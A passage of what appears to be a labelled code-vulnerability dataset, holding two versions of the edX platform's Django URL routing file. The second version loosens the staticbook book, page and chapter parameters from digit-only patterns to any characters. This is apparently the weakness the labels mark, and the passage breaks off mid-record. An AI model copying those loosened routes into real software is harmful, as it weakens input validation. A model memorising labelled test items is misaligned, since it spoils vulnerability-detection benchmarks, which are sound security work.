url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n            'staticbook.views.index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n/n/n/n", "label": 0}, {"id": "5fad9ccca43cdfb565b3f80914f998afa7f2fa78", "code": "/lms/urls.py/n/nfrom django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account', name='create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            